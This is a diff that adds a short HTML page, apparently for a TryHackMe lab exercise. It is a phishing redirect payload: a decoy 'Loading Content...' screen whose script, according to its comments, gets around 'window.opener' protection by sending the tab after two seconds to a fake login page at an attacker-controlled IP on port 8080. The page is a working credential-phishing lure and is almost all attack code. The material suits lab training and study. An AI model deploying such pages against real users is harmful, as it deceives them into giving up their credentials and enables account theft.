@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading...</title>
+  <style>
+    body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f4f4f4; color: #333; }
+    .container { text-align: center; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Loading Content...</h1>
+    <p>You are being redirected to the requested resource.</p>
+  </div>
+  <script>
+    // This script bypasses the 'window.opener' protection by redirecting the current tab.
+    // The user sees this page for a moment, then it changes to the fake login page.
+    console.log("Bypassing window.opener protection. Redirecting this tab in 2 seconds...");
+    
+    setTimeout(function() {
+      // Make sure to replace YOUR_THM_IP with your actual TryHackMe VPN IP.
+      window.location.href = "http://10.14.107.24:8080/login.html";
+    }, 2000); // 2-second delay
+  </script>
+</body>
+</html>
+
